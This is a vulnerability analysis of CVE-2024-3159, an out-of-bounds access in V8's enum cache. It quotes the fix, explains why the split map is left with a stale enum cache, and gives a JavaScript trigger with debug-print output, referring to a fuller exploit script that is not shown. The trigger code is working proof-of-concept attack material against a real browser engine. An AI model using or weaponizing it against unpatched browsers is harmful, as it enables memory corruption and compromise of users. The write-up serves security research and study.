# CVE-2024-3159

## Description

Out of bounds access in enum cache.

## Analysis

The patch
```cpp
  bool had_any_enum_cache =
      split_map->instance_descriptors(isolate_)
              ->enum_cache()
              ->keys()
              ->length() > 0 ||
      old_descriptors_->enum_cache()->keys()->length() > 0;     // [1] patch

  // Deprecated part of the transition tree is no longer reachable, so replace
  // current instance descriptors in the "survived" part of the tree with
  // the new descriptors to maintain descriptors sharing invariant.
  split_map->ReplaceDescriptors(isolate_, *new_descriptors);

  // If the old descriptors had an enum cache (or if {split_map}'s descriptors
  // had one), make sure the new ones do too.
  if (had_any_enum_cache && new_map->NumberOfEnumerableProperties() > 0) {
    FastKeyAccumulator::InitializeFastPropertyEnumCache(
        isolate_, new_map, new_map->NumberOfEnumerableProperties());
  }
```

The patch adds
```cpp
      split_map->instance_descriptors(isolate_)
              ->enum_cache()
              ->keys()
              ->length() > 0 
```

The problem is that when creating a new map, the enum cache of the `old_descriptor` can be empty while the `split_map` can still hold an enum cache in the `instance_descriptor`. Thus this bug will result in an uninitialized enum cache in the `split_map` and all other maps linked by the back pointer.

## Exploit

We can create a split map like this:

```javascript
const object1 = {};
object1.a = 1;
const object2 = {};
object2.a = 16705;
object2.b = 3;
const object3 = {};
object3.a = 4;
object3.b = 5;
object3.c = 6;
Object.defineProperty(object3, "d", { writable: false, enumerable: true, value: 7 });
const object4 = {};
object4.a = 8;
object4.b = 9;
object4.c = 10;
object4.d = 11;                     // split_map
```

```
=========
DebugPrint: 0x102200048bdd: [JS_OBJECT_TYPE]
 - map: 0x102200298895 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x102200282595 <Object map = 0x102200281bd1>
 - elements: 0x1022000006fd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x1022000006fd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x102200002ac9: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
 }
0x102200298895: [Map] in OldSpace
 - map: 0x10220028169d <MetaMap (0x1022002816ed <NativeContext[289]>)>
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - unused property fields: 3
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - back pointer: 0x1022002823c9 <Map[28](HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x1022002988dd <Cell value= 0>
 - instance descriptors #1: 0x102200048d39 <DescriptorArray[4]>
 - transitions #1: 0x1022002988e5 <Map[28](HOLEY_ELEMENTS)>
     0x102200002ad9: [String] in ReadOnlySpace: #b: (transition to (const data field, attrs: [WEC]) @ Any) -> 0x1022002988e5 <Map[28](HOLEY_ELEMENTS)>
 - prototype: 0x102200282595 <Object map = 0x102200281bd1>
 - constructor: 0x1022002820d9 <JSFunction Object (sfi = 0x1022002745e5)>
 - dependent code: 0x10220000070d <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

=========
DebugPrint: 0x102200048c15: [JS_OBJECT_TYPE]
 - map: 0x1022002988e5 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x102200282595 <Object map = 0x102200281bd1>
 - elements: 0x1022000006fd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x1022000006fd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x102200002ac9: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
    0x102200002ad9: [String] in ReadOnlySpace: #b: 1 (const data field 1), location: in-object
 }
0x1022002988e5: [Map] in OldSpace
 - map: 0x10220028169d <MetaMap (0x1022002816ed <NativeContext[289]>)>
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - unused property fields: 2
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - back pointer: 0x102200298895 <Map[28](HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x1022002988dd <Cell value= 0>
 - instance descriptors #2: 0x102200048d39 <DescriptorArray[4]>
 - transitions #1: 0x10220029890d <Map[28](HOLEY_ELEMENTS)>
     0x102200002ae9: [String] in ReadOnlySpace: #c: (transition to (const data field, attrs: [WEC]) @ Any) -> 0x10220029890d <Map[28](HOLEY_ELEMENTS)>
 - prototype: 0x102200282595 <Object map = 0x102200281bd1>
 - constructor: 0x1022002820d9 <JSFunction Object (sfi = 0x1022002745e5)>
 - dependent code: 0x10220000070d <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

=========
DebugPrint: 0x102200048c59: [JS_OBJECT_TYPE]
 - map: 0x102200298a05 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x102200282595 <Object map = 0x102200281bd1>
 - elements: 0x1022000006fd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x1022000006fd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x102200002ac9: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
    0x102200002ad9: [String] in ReadOnlySpace: #b: 1 (const data field 1), location: in-object
    0x102200002ae9: [String] in ReadOnlySpace: #c: 1 (const data field 2), location: in-object
    0x102200002af9: [String] in ReadOnlySpace: #d: 1 (const data field 3), location: in-object
 }
0x102200298a05: [Map] in OldSpace
 - map: 0x10220028169d <MetaMap (0x1022002816ed <NativeContext[289]>)>
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x10220029890d <Map[28](HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x102200000a61 <Cell value= 1>
 - instance descriptors (own) #4: 0x102200048d39 <DescriptorArray[4]>
 - prototype: 0x102200282595 <Object map = 0x102200281bd1>
 - constructor: 0x1022002820d9 <JSFunction Object (sfi = 0x1022002745e5)>
 - dependent code: 0x10220000070d <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

=========
DebugPrint: 0x102200048d79: [JS_OBJECT_TYPE]
 - map: 0x102200298a2d <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x102200282595 <Object map = 0x102200281bd1>
 - elements: 0x1022000006fd <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x1022000006fd <FixedArray[0]>
 - All own properties (excluding elements): {
    0x102200002ac9: [String] in ReadOnlySpace: #a: 1 (const data field 0), location: in-object
    0x102200002ad9: [String] in ReadOnlySpace: #b: 1 (const data field 1), location: in-object
    0x102200002ae9: [String] in ReadOnlySpace: #c: 1 (const data field 2), location: in-object
    0x102200002af9: [String] in ReadOnlySpace: #d: 1 (const data field 3), location: in-object
 }
0x102200298a2d: [Map] in OldSpace
 - map: 0x10220028169d <MetaMap (0x1022002816ed <NativeContext[289]>)>
 - type: JS_OBJECT_TYPE
 - instance size: 28
 - inobject properties: 4
 - unused property fields: 0
 - elements kind: HOLEY_ELEMENTS
 - enum length: invalid
 - stable_map
 - back pointer: 0x10220029890d <Map[28](HOLEY_ELEMENTS)>
 - prototype_validity cell: 0x1022002988dd <Cell value= 0>
 - instance descriptors (own) #4: 0x102200048d95 <DescriptorArray[4]>
 - prototype: 0x102200282595 <Object map = 0x102200281bd1>
 - constructor: 0x1022002820d9 <JSFunction Object (sfi = 0x1022002745e5)>
 - dependent code: 0x10220000070d <Other heap object (WEAK_ARRAY_LIST_TYPE)>
 - construction counter: 0

=========
```

```javascript
const object1 = {};
object1.a = 1;
const object2 = {};
object2.a = 2;
object2.b = 3;
const object3 = {};
object3.a = 4;
object3.b = 5;
object3.c = 6;
Object.defineProperty(object3, "d", { writable: false, enumerable: true, value: 7 });
const object4 = {};
object4.a = 8;
object4.b = 9;
object4.c = 10;
object4.d = 11;

function trigger(callback) {
    for (let key in object2) {
        callback(object2[key]);
    }
}

for (let i = 0; i < 0x50000; ++i) { 
    trigger(_ => _);
    trigger(_ => _);
    trigger(_ => _);
    trigger(_ => _);
    trigger(_ => _);
}

trigger(v => {
    object4.c = 1.1;
    for (let key in object1) { }
    console.log(v);
});
```

A more detailed exploitation script in `pwn.js`

